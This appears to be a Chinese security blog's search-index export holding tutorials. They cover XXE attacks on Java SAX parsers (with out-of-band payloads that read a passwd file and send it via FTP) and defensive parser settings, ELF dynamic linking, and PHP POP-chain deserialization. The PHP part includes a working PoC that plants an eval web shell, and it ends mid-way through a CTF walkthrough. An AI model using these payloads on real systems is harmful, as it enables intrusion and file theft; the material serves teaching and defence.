<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[XML注入之SAXBuilder]]></title>
    <url>%2F2019%2F05%2F26%2FXML%E6%B3%A8%E5%85%A5%E4%B9%8BSAXBuilder%2F</url>
    <content type="text"><![CDATA[0x01 何为SAXBuilderSAXBuilder是一个JDOM解析器，能将路径中的XML文件解析为Document对象。 SAXBuilder使用第三方SAX解析器（默认情况下由JAXP选择，或者您可以手动配置）来处理解析任务，并使用SAXHandler的实例来侦听SAX事件，以便使用JDOM内容构造文档一个JDOMFactory。 0x02 常规用法Demo需要下载org.jdom的jar包：http://www.jdom.org/dist/binary/jdom-2.0.6.zip 先定义一个user.xml，用于让DocumentBuilder来解析： 123456&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;20&lt;/age&gt;&lt;/user&gt; Demo代码： 12345678910111213141516171819202122public class test &#123; public static void main(String[] args) throws Exception&#123; File f = new File("user.xml"); saxBuilder(f); &#125; public static void saxBuilder(File f)&#123; try &#123; SAXBuilder saxBuilder = new SAXBuilder(); org.jdom2.Document d = saxBuilder.build(f); Element root = d.getRootElement(); List&lt;Element&gt; childs = root.getChildren(); for (Element child : childs)&#123; String name = child.getName(); String text = child.getText(); System.out.println(name + ":" + text); &#125; &#125; catch (Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; 运行后，发现成功解析了user.xml的内容： 0x03 XML注入漏洞验证具体的步骤参考之前的博客《XML注入之DocumentBuilder与XXE攻击防御》，这里不再赘述。 下面只进行无回显外带OOB攻击Demo： 123456789101112131415public class test &#123; public static void main(String[] args) throws Exception&#123; File f = new File("user.xml"); saxBuilder(f); &#125; public static void saxBuilder(File f)&#123; try &#123; SAXBuilder saxBuilder = new SAXBuilder(); org.jdom2.Document d = saxBuilder.build(f); &#125; catch (Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; ftp.xml 12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[ &lt;!ENTITY % file SYSTEM &quot;file:///e:/passwd&quot;&gt; &lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1/xxe/ftp.dtd&quot;&gt; %remote; %all; ]&gt;&lt;root&gt;&amp;send;&lt;/root&gt; ftp.dtd 1&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;ftp://127.0.0.1:21/%file;&apos;&gt;&quot;&gt; 运行本地FTPServer接收数据： 0x04 检测方法1、在Java项目中搜索org.jdom下的SAXBuilder，排查是否使用了该API解析XML文档内容； 2、若使用了，则进一步排查是否禁用了不安全的操作，具体的是看setFeature()的设置是否存在绕过的可能； 3、除了setFeature()的设置外，检查Reader在read()解析xml数据之前是否采用setEntityResolver()的方式来设置自定义实体解析方式； 0x05 防御方法1234saxBuilder.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);saxBuilder.setFeature("http://xml.org/sax/features/external-general-entities", false);saxBuilder.setFeature("http://xml.org/sax/features/external-parameter-entities", false);saxBuilder.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>Java</tag>
        <tag>XML注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XML注入之SAXParser]]></title>
    <url>%2F2019%2F05%2F26%2FXML%E6%B3%A8%E5%85%A5%E4%B9%8BSAXParser%2F</url>
    <content type="text"><![CDATA[0x01 何为SAXParserJava中javax.xml.parsers下的常用的解析XML格式内容的类。 0x02 常规用法Demo先定义一个user.xml，用于让DocumentBuilder来解析： 123456&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;20&lt;/age&gt;&lt;/user&gt; Demo代码： 12345678910111213141516171819public class test &#123; public static void main(String[] args) throws Exception&#123; File f = new File("user.xml"); saxParser(f); &#125; public static void saxParser(File f)&#123; try &#123; SAXParserFactory saxParserFactory = SAXParserFactory.newInstance(); SAXParser saxParser = saxParserFactory.newSAXParser(); MyDefaultHandler defaultHandler = new MyDefaultHandler(); saxParser.parse(f, defaultHandler); char[] c = &#123;&#125;; defaultHandler.characters(c, 0, 1); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 这里输出的话需要自己来写下解析代码，这里示例是继承DefaultHandler类重写characters()方法即可输出： 1234567public class MyDefaultHandler extends DefaultHandler &#123; public void characters (char ch[], int start, int length) throws SAXException &#123; System.out.println(ch); &#125;&#125; 运行后，发现成功解析了user.xml的内容，但是有瑕疵，输出多次了： 0x03 XML注入漏洞验证具体的步骤参考之前的博客《XML注入之DocumentBuilder与XXE攻击防御》，这里不再赘述。 下面只进行无回显外带OOB攻击Demo： 1234567891011121314151617public class test &#123; public static void main(String[] args) throws Exception&#123; File f = new File("ftp.xml"); saxParser(f); &#125; public static void saxParser(File f)&#123; try &#123; SAXParserFactory saxParserFactory = SAXParserFactory.newInstance(); SAXParser saxParser = saxParserFactory.newSAXParser(); MyDefaultHandler defaultHandler = new MyDefaultHandler(); saxParser.parse(f, defaultHandler); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; ftp.xml 12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[ &lt;!ENTITY % file SYSTEM &quot;file:///e:/passwd&quot;&gt; &lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1/xxe/ftp.dtd&quot;&gt; %remote; %all; ]&gt;&lt;root&gt;&amp;send;&lt;/root&gt; ftp.dtd 1&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;ftp://127.0.0.1:21/%file;&apos;&gt;&quot;&gt; 运行本地FTPServer接收数据： 0x04 检测方法1、在Java项目中搜索javax.xml.parsers下的SAXParser和SAXParserFactory，排查是否使用了该API解析XML文档内容； 2、若使用了，则进一步排查是否禁用了不安全的操作，具体的是看setFeature()的设置是否存在绕过的可能； 0x05 防御方法1234saxParser.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);saxParser.setFeature("http://xml.org/sax/features/external-general-entities", false);saxParser.setFeature("http://xml.org/sax/features/external-parameter-entities", false);saxParser.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>Java</tag>
        <tag>XML注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XML注入之SAXReader]]></title>
    <url>%2F2019%2F05%2F24%2FXML%E6%B3%A8%E5%85%A5%E4%B9%8BSAXReader%2F</url>
    <content type="text"><![CDATA[0x01 何为SAXReader官方描述： Flexible XML framework for Java. 即灵活的Java XML框架，用于解析XML格式的内容。 0x02 常规用法Demo需要下载dom4j的jar包：https://dom4j.github.io/ 先定义一个user.xml，用于让DocumentBuilder来解析： 123456&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;20&lt;/age&gt;&lt;/user&gt; Demo代码： 123456789101112131415161718public class test &#123; public static void main(String[] args) throws Exception&#123; File f = new File("user.xml"); saxReader(f); &#125; public static void saxReader(File f) throws DocumentException&#123; SAXReader saxReader = new SAXReader(); org.dom4j.Document d = saxReader.read(f); Element root = d.getRootElement(); List&lt;Element&gt; childs = root.elements(); for (Element child : childs)&#123; String name = child.getName(); String text = child.getText(); System.out.println(name + ":" + text); &#125; &#125;&#125; 运行后，发现成功解析了user.xml的内容： 0x03 XML注入漏洞验证具体的步骤参考之前的博客《XML注入之DocumentBuilder与XXE攻击防御》，这里不再赘述。 下面只进行无回显外带OOB攻击Demo： 1234567891011public class test &#123; public static void main(String[] args) throws Exception&#123; File f = new File("ftp.xml"); saxReader(f); &#125; public static void saxReader(File f) throws DocumentException&#123; SAXReader saxReader = new SAXReader(); org.dom4j.Document d = saxReader.read(f); &#125;&#125; ftp.xml 12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[ &lt;!ENTITY % file SYSTEM &quot;file:///e:/passwd&quot;&gt; &lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1/xxe/ftp.dtd&quot;&gt; %remote; %all; ]&gt;&lt;root&gt;&amp;send;&lt;/root&gt; ftp.dtd 1&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;ftp://127.0.0.1:21/%file;&apos;&gt;&quot;&gt; 运行本地FTPServer接收数据： 0x04 检测方法1、在Java项目中搜索org.dom4j下的SAXReader，排查是否使用了该API解析XML文档内容； 2、若使用了，则进一步排查是否禁用了不安全的操作，具体的是看setFeature()的设置是否存在绕过的可能； 3、除了setFeature()的设置外，检查Reader在read()解析xml数据之前是否采用setEntityResolver()的方式来设置自定义实体解析方式； 0x05 防御方法1234saxReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);saxReader.setFeature("http://xml.org/sax/features/external-general-entities", false);saxReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);saxReader.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>Java</tag>
        <tag>XML注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ELF动态链接,PLT和GOT]]></title>
    <url>%2F2019%2F05%2F24%2FGOT%E8%A1%A8-PLT%E8%A1%A8%E4%B8%8E%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%2F</url>
    <content type="text"><![CDATA[当一个程序被加载进内存时，动态链接器会把需要的共享库加载并绑定到该进程的地址空间中。 共享库在被编译到可执行文件中时是位置独立的，因此很容易被重定位到进程的地址空间中。一个共享库就是一个动态的ELF目标文件。在终端输入readelf -h libc.so命令，会看到e_type（ELF文件类型）是ET_DYN。动态目标文件与可执行文件非常类似，是由程序解释器加载的，通常没有PT_INTERP段，因而不会触发程序解释器。 当一个共享库被加载进一个进程的地址空间中时，一定有指向其他共享库的重定位。动态链接器会修改可执行文件中的GOT（Global Offset Table全局偏移表）。GOT位于数据段中（.got.plt节），因为GOT必须是可写的（至少最初是可写的，可以将只读重定位看做是一种安全特性），因而位于数据段中。动态链接器会使用解析好的共享库地址来修改GOT。 0x01 辅助向量通过系统调用sys_execve()将程序加载到内存中时，对应的可执行文件会被映射到内存的地址空间，并为该进程的地址空间分配一个栈。这个栈会用特定的方式向动态链接器传递信息。这种特定的对信息的设置和安排即为辅助向量（auxv）。 如下x86结构中，占地存放了以下信息： 辅助向量是一系列ElfN_auxv_t的结构： 123456789101112131415161718192021222324252627#ifndef HAVE_ELF32_AUXV_T typedef struct &#123; uint32_t a_type; /* Entry type */ union &#123; uint32_t a_val; /* Integer value */ /* We use to have pointer elements added here. We cannot do that, though, since it does not work when using 32-bit definitions on 64-bit platforms and vice versa. */ &#125; a_un; &#125; Elf32_auxv_t; #endif #ifndef HAVE_ELF64_AUXV_T typedef struct &#123; uint64_t a_type; /* Entry type */ union &#123; uint64_t a_val; /* Integer value */ /* We use to have pointer elements added here. We cannot do that, though, since it does not work when using 32-bit definitions on 64-bit platforms and vice versa. */ &#125; a_un; &#125; Elf64_auxv_t; #endif a_type指定了辅助向量的条目类型，a_val为辅助向量的值。 下面是动态链接器所需要的一些最重要的条目类型： 1234567#define AT_EXECFD 2 /* File descriptor of program */#define AT_PHDR 3 /* Program headers for program */#define AT_PHENT 4 /* Size of program header entry */#define AT_PHNUM 5 /* Number of program headers */#define AT_PAGESZ 6 /* System page size */#define AT_ENTRY 9 /* Entry point of program */#define AT_UID 11 /* Real uid */ 动态链接器从栈中检索可执行程序相关的信息，如程序头、程序入口地址等。上面列出的只是从/usr/include/elf.h中挑选出的几个辅助向量条目类型。 辅助向量是由内核函数create_elf_tables()设定的，该函数在Linux的源码/usr/src/linux/fs/binfmt_elf.c中。 内核的执行过程和如下描述类似： sys_execve() 调用do_execve_common() 调用search_binary_handler() 调用load_elf_binary() 调用create_elf_tables() 下面是/usr/src/linux/fs/binfmt_elf.c中的函数create_elf_tables()的代码，这段代码会添加辅助向量条目： 123456NEW_AUX_ENT(AT_PAGESZ, ELF_EXEC_PAGESIZE);NEW_AUX_ENT(AT_PHDR, load_addr + exec-&gt;e_phoff);NEW_AUX_ENT(AT_PHENT, sizeof (struct elf_phdr));NEW_AUX_ENT(AT_PHNUM, exec-&gt;e_phnum);NEW_AUX_ENT(AT_BASE, interp_load_addr);NEW_AUX_ENT(AT_ENTRY, exec-&gt;e_entry); 可以看到，ELF的入口点和程序头地址，以及其他的值，是与内核中的NEW_AUX_ENT()宏一起入栈的。 程序被加载进内存，辅助向量被填充好之后，控制权就交给了动态链接器。动态链接器会解析要链接到进程地址空间的用于共享库的符号和重定位。默认情况下，可执行文件会动态链接GNU C库libc.so。 ldd命令能显示出一个给定的可执行文件所依赖的共享库列表。 0x02 GOT表和PLT表… 0x03 参考]]></content>
      <categories>
        <category>二进制基础</category>
      </categories>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP对象注入之pop链构造]]></title>
    <url>%2F2019%2F05%2F04%2FPHP%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E4%B9%8Bpop%E9%93%BE%E6%9E%84%E9%80%A0%2F</url>
    <content type="text"><![CDATA[0x01 pop链我们知道，PHP反序列化漏洞的问题点是出在写得不安全的魔法函数上，有漏洞的魔法函数会让攻击者构造恶意的exp来触发，因为魔法函数会自动调用从而触发漏洞。 但如果漏洞代码不在魔法方法中，而是在一个类的普通方法中，这时就可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。因为PHP反序列化可以控制类属性，无论是private还是public。 看个Demo就容易理解了。 12345678910111213141516171819202122232425262728&lt;?phpclass mi1k7ea &#123; protected $ClassObj; function __construct() &#123; $this-&gt;ClassObj = new normal(); &#125; function __destruct() &#123; $this-&gt;ClassObj-&gt;action(); &#125;&#125;class normal &#123; function action() &#123; echo "hello"; &#125;&#125;class evil &#123; private $data; function action() &#123; eval($this-&gt;data); &#125;&#125;unserialize($_GET['d']);?&gt; mi1k7ea这个类本来是调用normal类的，而normal类中含有action()方法用于显示字符串，但是现在action()方法在evil类里面也有，所以可以构造pop链，调用evil类中的action()方法。 12345678910111213141516&lt;?phpclass mi1k7ea &#123; protected $ClassObj; function __construct() &#123; $this-&gt;ClassObj = new evil(); &#125;&#125;class evil &#123; private $data = "phpinfo();";&#125;$m7 = new mi1k7ea();echo urlencode(serialize($m7));?&gt; 注意的是，protected $ClassObj = new evil();是不行的，还是通过__construct来实例化。 payload： 1O%3A7%3A%22mi1k7ea%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D 0x02 练习这里看一道pop链题目。 访问页面，显示源码，如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156&lt;?phpclass OutputFilter &#123; protected $matchPattern; protected $replacement; function __construct($pattern, $repl) &#123; $this-&gt;matchPattern = $pattern; $this-&gt;replacement = $repl; &#125; function filter($data) &#123; return preg_replace($this-&gt;matchPattern, $this-&gt;replacement, $data); &#125;&#125;;class LogFileFormat &#123; protected $filters; protected $endl; function __construct($filters, $endl) &#123; $this-&gt;filters = $filters; $this-&gt;endl = $endl; &#125; function format($txt) &#123; foreach ($this-&gt;filters as $filter) &#123; $txt = $filter-&gt;filter($txt); &#125; $txt = str_replace('\n', $this-&gt;endl, $txt); return $txt; &#125;&#125;;class LogWriter_File &#123; protected $filename; protected $format; function __construct($filename, $format) &#123; $this-&gt;filename = str_replace("..", "__", str_replace("/", "_", $filename)); $this-&gt;format = $format; &#125; function writeLog($txt) &#123; $txt = $this-&gt;format-&gt;format($txt); //TODO: Modify the address here, and delete this TODO. file_put_contents("E:\\www\\pop\\" . $this-&gt;filename, $txt, FILE_APPEND); &#125;&#125;;class Logger &#123; protected $logwriter; function __construct($writer) &#123; $this-&gt;logwriter = $writer; &#125; function log($txt) &#123; $this-&gt;logwriter-&gt;writeLog($txt); &#125;&#125;;class Song &#123; protected $logger; protected $name; protected $group; protected $url; function __construct($name, $group, $url) &#123; $this-&gt;name = $name; $this-&gt;group = $group; $this-&gt;url = $url; $fltr = new OutputFilter("/\[i\](.*)\[\/i\]/i", "&lt;i&gt;\\1&lt;/i&gt;"); $this-&gt;logger = new Logger(new LogWriter_File("song_views", new LogFileFormat(array($fltr), "\n"))); &#125; function __toString() &#123; return "&lt;a href='" . $this-&gt;url . "'&gt;&lt;i&gt;" . $this-&gt;name . "&lt;/i&gt;&lt;/a&gt; by " . $this-&gt;group; &#125; function log() &#123; $this-&gt;logger-&gt;log("Song " . $this-&gt;name . " by [i]" . $this-&gt;group . "[/i] viewed.\n"); &#125; function get_name() &#123; return $this-&gt;name; &#125;&#125;class Lyrics &#123; protected $lyrics; protected $song; function __construct($lyrics, $song) &#123; $this-&gt;song = $song; $this-&gt;lyrics = $lyrics; &#125; function __toString() &#123; return "&lt;p&gt;" . $this-&gt;song-&gt;__toString() . "&lt;/p&gt;&lt;p&gt;" . str_replace("\n", "&lt;br /&gt;", $this-&gt;lyrics) . "&lt;/p&gt;\n"; &#125; function __destruct() &#123; $this-&gt;song-&gt;log(); &#125; function shortForm() &#123; return "&lt;p&gt;&lt;a href='song.php?name=" . urlencode($this-&gt;song-&gt;get_name()) . "'&gt;" . $this-&gt;song-&gt;get_name() . "&lt;/a&gt;&lt;/p&gt;"; &#125; function name_is($name) &#123; return $this-&gt;song-&gt;get_name() === $name; &#125;&#125;;class User &#123; static function addLyrics($lyrics) &#123; $oldlyrics = array(); if (isset($_COOKIE['lyrics'])) &#123; $oldlyrics = unserialize(base64_decode($_COOKIE['lyrics'])); &#125; foreach ($lyrics as $lyric) $oldlyrics []= $lyric; setcookie('lyrics', base64_encode(serialize($oldlyrics))); &#125; static function getLyrics() &#123; if (isset($_COOKIE['lyrics'])) &#123; return unserialize(base64_decode($_COOKIE['lyrics'])); &#125; else &#123; setcookie('lyrics', base64_encode(serialize(array(1, 2)))); return array(1, 2); &#125; &#125;&#125;;class Porter &#123; static function exportData($lyrics) &#123; return base64_encode(serialize($lyrics)); &#125; static function importData($lyrics) &#123; return serialize(base64_decode($lyrics)); &#125;&#125;;class Conn &#123; protected $conn; function __construct($dbuser, $dbpass, $db) &#123; $this-&gt;conn = mysqli_connect("localhost", $dbuser, $dbpass, $db); &#125; function getLyrics($lyrics) &#123; $r = array(); foreach ($lyrics as $lyric) &#123; $s = intval($lyric); $result = $this-&gt;conn-&gt;query("SELECT data FROM lyrics WHERE id=$s"); while (($row = $result-&gt;fetch_row()) != NULL) &#123; $r []= unserialize(base64_decode($row[0])); &#125; &#125; return $r; &#125; function addLyrics($lyrics) &#123; $ids = array(); foreach ($lyrics as $lyric) &#123; $this-&gt;conn-&gt;query("INSERT INTO lyrics (data) VALUES (\"" . base64_encode(serialize($lyric)) . "\")"); $res = $this-&gt;conn-&gt;query("SELECT MAX(id) FROM lyrics"); $id= $res-&gt;fetch_row(); $ids[]= intval($id[0]); &#125; echo var_dump($ids); return $ids; &#125; function __destruct() &#123; $this-&gt;conn-&gt;close(); $this-&gt;conn = NULL; &#125;&#125;;if (isset($_GET['cmd'])) &#123; unserialize($_GET['cmd']);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; pop链构造分析分析一下，我们是需要构造pop链触发反序列化漏洞，那就先寻找存在unserialize()函数调用的地方，发现定义的类方法中有3处存在调用unserialize()函数： 12345678910111213141516171819202122232425262728class User &#123; static function addLyrics($lyrics) &#123; $oldlyrics = array(); if (isset($_COOKIE['lyrics'])) &#123; $oldlyrics = unserialize(base64_decode($_COOKIE['lyrics'])); &#125; foreach ($lyrics as $lyric) $oldlyrics []= $lyric; setcookie('lyrics', base64_encode(serialize($oldlyrics))); &#125; static function getLyrics() &#123; if (isset($_COOKIE['lyrics'])) &#123; return unserialize(base64_decode($_COOKIE['lyrics'])); &#125;...class Conn &#123; ... function getLyrics($lyrics) &#123; $r = array(); foreach ($lyrics as $lyric) &#123; $s = intval($lyric); $result = $this-&gt;conn-&gt;query("SELECT data FROM lyrics WHERE id=$s"); while (($row = $result-&gt;fetch_row()) != NULL) &#123; $r []= unserialize(base64_decode($row[0])); &#125; &#125; return $r; &#125;... 其中Conn类中调用的unserialize()函数的参数是通过执行SQL查询获取的，无法直接控制；而User类中两个unserialize()函数的参数都是通过cookie传入的，外部可控，那么切入点就在这里了。 既然知道了哪些类方法的unserialize()函数可控，那就找下可利用的魔法函数有哪些了。浏览了一遍方法，除去构造方法__construct()后，发现有个析构函数__destruct()中调用了该类成员变量的log()方法： 1234567891011class Lyrics &#123; protected $lyrics; protected $song; function __construct($lyrics, $song) &#123; $this-&gt;song = $song; $this-&gt;lyrics = $lyrics; &#125; ... function __destruct() &#123; $this-&gt;song-&gt;log(); &#125; 看到song变量可以通过构造方法直接赋值。那么接下来看看哪些类含有log()方法： 123456789101112131415class Logger &#123; protected $logwriter;// function __construct($writer) &#123; $this-&gt;logwriter = $writer; &#125; function log($txt) &#123;// $this-&gt;logwriter-&gt;writeLog($txt); &#125;&#125;;...class Song &#123; ... function log() &#123; $this-&gt;logger-&gt;log("Song " . $this-&gt;name . " by [i]" . $this-&gt;group . "[/i] viewed.\n"); &#125; 发现Logger类和Song类中都有log()方法，看明显看出Logger类的log()方法疑似可利用，因为其中调用了该类logwriter成员变量的writeLog()方法。 下面找下writeLog()方法，发现只有LogWriter_File类中定义了，并且其功能是想指定Web目录路径上写文件： 12345678910111213class LogWriter_File &#123; protected $filename; protected $format; function __construct($filename, $format) &#123; $this-&gt;filename = str_replace("..", "__", str_replace("/", "_", $filename)); $this-&gt;format = $format; &#125; function writeLog($txt) &#123; $txt = $this-&gt;format-&gt;format($txt); //TODO: Modify the address here, and delete this TODO. file_put_contents("E:\\www\\pop\\" . $this-&gt;filename, $txt, FILE_APPEND); &#125;&#125;; 注意一点就是，这里调用了format()方法对参数进行格式化处理，format()方法的定义在LogFileFormat类中： 123456789101112131415class LogFileFormat &#123; protected $filters; protected $endl; function __construct($filters, $endl) &#123; $this-&gt;filters = $filters; $this-&gt;endl = $endl; &#125; function format($txt) &#123; foreach ($this-&gt;filters as $filter) &#123; $txt = $filter-&gt;filter($txt); &#125; $txt = str_replace('\n', $this-&gt;endl, $txt); return $txt; &#125;&#125;; 其中又调用了filter()方法过滤内容，然后调用str_replace()方法将换行符替换成endl成员变量的值。 filter()方法是定义在OutputFilter类中，作用是使用成员变量matchPattern的值作为pattern进行正则匹配过滤： 1234567891011class OutputFilter &#123; protected $matchPattern; protected $replacement; function __construct($pattern, $repl) &#123; $this-&gt;matchPattern = $pattern; $this-&gt;replacement = $repl; &#125; function filter($data) &#123; return preg_replace($this-&gt;matchPattern, $this-&gt;replacement, $data); &#125;&#125;; 看到这里，调用了preg_replace()，当PHP版本不高于5.5时可以用正则的/e模式来执行php代码。 最后借lemon大佬个图理一下呗： 触发点1即写shell文件，触发点2即preg_replace()代码注入但限制PHP版本&lt;=5.5。 PoC编写由于本地环境的PHP是5.6，就构造第一个触发点的PoC吧。 poc.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phpclass OutputFilter &#123; protected $matchPattern; protected $replacement; function __construct($pattern, $repl) &#123; $this-&gt;matchPattern = $pattern; $this-&gt;replacement = $repl; &#125;&#125;;class LogFileFormat &#123; protected $filters; protected $endl; function __construct($filters, $endl) &#123; $this-&gt;filters = $filters; $this-&gt;endl = $endl; &#125;&#125;;class LogWriter_File &#123; protected $filename; protected $format; function __construct($filename, $format) &#123; $this-&gt;filename = str_replace("..", "__", str_replace("/", "_", $filename)); $this-&gt;format = $format; &#125;&#125;;class Logger &#123; protected $logwriter; function __construct($writer) &#123; $this-&gt;logwriter = $writer; &#125;&#125;;class Lyrics &#123; protected $lyrics; protected $song; function __construct($lyrics, $song) &#123; $this-&gt;song = $song; $this-&gt;lyrics = $lyrics; &#125;&#125;;$arr = array(new OutputFilter("//", "&lt;?php @eval(\$_GET['cmd']);?&gt;"));$obj1 = new LogFileFormat($arr, '\n');$obj2 = new LogWriter_File("muma.php", $obj1);$obj3 = new Logger($obj2);$obj = new Lyrics("666", $obj3);echo urlencode(serialize($obj));?&gt; 访问得到poc： 1O%3A6%3A%22Lyrics%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00lyrics%22%3Bs%3A3%3A%22666%22%3Bs%3A7%3A%22%00%2A%00song%22%3BO%3A6%3A%22Logger%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00logwriter%22%3BO%3A14%3A%22LogWriter_File%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A8%3A%22muma.php%22%3Bs%3A9%3A%22%00%2A%00format%22%3BO%3A13%3A%22LogFileFormat%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A12%3A%22OutputFilter%22%3A2%3A%7Bs%3A15%3A%22%00%2A%00matchPattern%22%3Bs%3A2%3A%22%2F%2F%22%3Bs%3A14%3A%22%00%2A%00replacement%22%3Bs%3A28%3A%22%3C%3Fphp+%40eval%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%3B%7D%7Ds%3A7%3A%22%00%2A%00endl%22%3Bs%3A2%3A%22%5Cn%22%3B%7D%7D%7D%7D 将该poc填入参数中访问： 弹出警告和注意信息。再尝试访问下我们的后门文件，已经存在了： 0x03 一道CTF题目访问页面，看到源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283&lt;?php //flag is in flag.php error_reporting(0); class oops &#123; protected $oop; function __construct() &#123; $this-&gt;oop = new a(); &#125; function __destruct() &#123; $this-&gt;oop-&gt;action(); &#125; &#125; class a &#123; function action() &#123; echo "Hello World!"; &#125; &#125; class b &#123; private $file; private $token; function action() &#123; if ((ord($this-&gt;token)&gt;47)&amp;(ord($this-&gt;token)&lt;58)) &#123; echo "token can't be a number!"; return ; &#125; if ($this-&gt;token==0)&#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\')==FALSE) &#123; include($this-&gt;file); echo $flag; &#125; &#125;else&#123; echo "Oops..."; &#125; &#125; &#125; class c &#123; private $cmd; private $token; function execcmd()&#123; if ((ord($this-&gt;token)&gt;47)&amp;(ord($this-&gt;token)&lt;58)) &#123; echo "token can't be a number!"; return ; &#125; if ($this-&gt;token==0)&#123; if (!empty($this-&gt;cmd))&#123; system($this-&gt;cmd); &#125; &#125;else&#123; echo "Oops..."; &#125; &#125; &#125; if (isset($_GET['a']) and isset($_GET['b'])) &#123; $a=$_GET['a']; $b=$_GET['b']; if (stripos($a,'.')) &#123; echo "You can't input '.' !"; return ; &#125; $data = @file_get_contents($a,'r'); if ($data=="HelloWorld!" and strlen($b)&gt;5 and eregi("666".substr($b,0,1),"6668") and substr($b,0,1)!=8)&#123; if (isset($_GET['c']))&#123; echo "get c 2333......&lt;br&gt;"; unserialize($_GET['c']); &#125; else &#123; echo "cccccc......"; &#125; &#125; else &#123; echo "Oh no......"; &#125; &#125; else &#123; show_source(__FILE__); &#125; ?&gt; 简单看下，考察两个点，一个是3处的弱类型校验，即参数a、b以及类成员变量token，另一个是反序列化pop链的构造。 弱类型Bypass先看下参数a和b，要同时通过GET输入并绕过类型比较才能往下执行到反序列化的逻辑： 123456if (stripos($a,'.')) &#123; echo "You can't input '.' !"; return ; &#125; $data = @file_get_contents($a,'r'); if ($data=="HelloWorld!" and strlen($b)&gt;5 and eregi("666".substr($b,0,1),"6668") and substr($b,0,1)!=8) 对于参数a，不能输入“.”，过滤了跨目录访问，并且调用file_get_contents()函数读取名为a的文件内容，且内容为”HelloWorld!”——解决办法：file_get_contents()函数支持php伪协议，这里我们可以使用php:/input，然后再POST字符串”HelloWorld!”即可绕过 对于参数b，其长度必须大于5，第一个字符紧接着拼接在”666”字符串后面要能正则匹配上”6668”字符串，且限定第一个字符不能为8——解决办法：这里限定了参数第一个字符不能为8，但是缺陷在于使用正则匹配，我们这里可以使用%00截断作为参数b的起始字符，截断掉后面的字符从而实现666和6668能够匹配成功实现绕过，剩下的字符拼够5个字节以上即可 再看下成员变量token，其在类b和类c中均存在： 123456789101112131415161718192021class b &#123; private $file; private $token; function action() &#123; if ((ord($this-&gt;token)&gt;47)&amp;(ord($this-&gt;token)&lt;58)) &#123; echo "token can't be a number!"; return ; &#125; if ($this-&gt;token==0)&#123; ... class c &#123; private $cmd; private $token; function execcmd()&#123; if ((ord($this-&gt;token)&gt;47)&amp;(ord($this-&gt;token)&lt;58)) &#123; echo "token can't be a number!"; return ; &#125; if ($this-&gt;token==0)&#123; ... 可以看到，先判断token是否为数字字符，不是才会往下判断token的值是否为0，为0则进入关键代码。但是这里判断是否为0的符号是==，存在弱类型绕过，当我们输入一个字符如a时，’a’==0是成立的。 pop链构造我们回到几个类的定义中再看看，发现只有oops类存在魔法函数__construct()和__destruct()，分析该函数： 成员变量oop，在__construct()函数中初始化为a类的实例； 